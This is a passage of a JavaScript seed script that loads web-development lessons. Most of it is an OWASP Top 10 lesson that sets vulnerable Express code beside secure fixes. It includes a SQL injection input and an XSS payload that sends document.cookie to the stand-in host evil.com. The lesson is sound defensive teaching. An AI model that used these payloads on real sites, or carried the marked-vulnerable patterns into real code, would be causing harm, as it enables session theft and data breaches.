2. Why is the payload NOT secure for sensitive data?
3. What is the difference between access and refresh tokens?
4. Why store refresh tokens in httpOnly cookies?

## Assignment
Implement complete auth: register (bcrypt hash), login (JWT + refresh token), protected endpoint, token refresh endpoint, and logout (clear cookie + blacklist token). Test all scenarios including expired tokens.`,35,1),

L("m1008","OWASP Top 10",`# OWASP Top 10 Security Vulnerabilities

## Why This Topic Matters
The OWASP Top 10 represents the most critical security risks for web applications. Every developer needs to know these — ignorance of them leads to data breaches, legal liability, and loss of user trust.

## Learning Objectives
- Know the OWASP Top 10 vulnerabilities
- Recognize vulnerable code patterns
- Write secure code for each risk
- Implement security best practices

## Core Concepts

### 1. Injection (SQL, NoSQL, Command)
\`\`\`javascript
// ❌ VULNERABLE — SQL Injection
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
// Attacker inputs: ' OR '1'='1 → bypasses auth!

// ✅ SECURE — Parameterized queries
const user = await db.query('SELECT * FROM users WHERE email = $1', [req.body.email]);
\`\`\`

### 2. Broken Authentication
\`\`\`javascript
// ❌ VULNERABLE
if (req.body.password === storedPassword) // Plaintext!

// ✅ SECURE — Hash with bcrypt
const hash = await bcrypt.hash(password, 12); // saltRounds: 10-12
const valid = await bcrypt.compare(password, hash);
\`\`\`

### 3. Sensitive Data Exposure
\`\`\`javascript
// ❌ VULNERABLE — Returning password in API response
res.json({ id: user.id, email: user.email, password: user.password });

// ✅ SECURE — Exclude sensitive fields
const { password, ...safeUser } = user;
res.json(safeUser);

// Also: always use HTTPS, encrypt data at rest
\`\`\`

### 4. XSS (Cross-Site Scripting)
\`\`\`javascript
// ❌ VULNERABLE — Unsanitized output in HTML
document.getElementById('msg').innerHTML = req.body.message;
// Attacker inputs: <script>fetch('evil.com?c='+document.cookie)</script>

// ✅ SECURE — Use textContent, not innerHTML
document.getElementById('msg').textContent = message;

// For server-rendered HTML: use DOMPurify or he library
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
\`\`\`

### 5. Broken Access Control
\`\`\`javascript
// ❌ VULNERABLE — No authorization check
app.get('/api/users/:id/data', authenticate, async (req, res) => {
  const data = await db.getUserData(req.params.id); // Any user can see any data!
});

// ✅ SECURE — Verify ownership
app.get('/api/users/:id/data', authenticate, async (req, res) => {
  if (req.user.id !== parseInt(req.params.id) && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const data = await db.getUserData(req.params.id);
  res.json(data);
});
\`\`\`

### 6. Security Misconfiguration
\`\`\`javascript
// ✅ Use helmet for security headers
const helmet = require('helmet');
app.use(helmet());
// Sets: X-Content-Type-Options, X-Frame-Options, CSP, etc.

// ✅ Hide technology stack
app.disable('x-powered-by'); // Don't reveal "Express"

// ✅ CORS configuration
app.use(cors({ origin: process.env.ALLOWED_ORIGIN })); // Not '*'
\`\`\`

### 7. CSRF (Cross-Site Request Forgery)
\`\`\`
Attack: Attacker tricks logged-in user into making requests they didn't intend
Defense: CSRF tokens OR SameSite cookie attribute

// ✅ SameSite cookie
res.cookie('session', token, { sameSite: 'strict', httpOnly: true });
\`\`\`

### 8. Rate Limiting (Brute Force Protection)
\`\`\`javascript
const rateLimit = require('express-rate-limit');

app.use('/api/auth/login', rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // 10 attempts
  message: { error: 'Too many login attempts. Try again in 15 minutes.' }
}));
\`\`\`

## Security Checklist
- [ ] Parameterized queries (no SQL injection)
- [ ] bcrypt for passwords (min rounds: 10)
- [ ] HTTPS only (redirect HTTP → HTTPS)
- [ ] Helmet middleware (security headers)
- [ ] Rate limiting on auth endpoints
- [ ] No sensitive data in JWT payload
- [ ] httpOnly cookies for tokens
- [ ] Input validation and sanitization
- [ ] Error messages don't reveal internals

## Interview Questions
1. What is SQL injection and how do you prevent it?
2. What is the difference between XSS and CSRF?
3. What does helmet.js do?
4. Why use bcrypt instead of MD5 for passwords?

## Assignment
Security audit an Express API: find and fix all OWASP vulnerabilities. Add: parameterized queries, bcrypt, helmet, rate limiting, proper CORS, input validation, and authorization checks. Write security tests.`,35,1),
]);

console.log("\n✅ All lesson batches pushed successfully!");
console.log("Lessons now available in all 14 course tracks.");
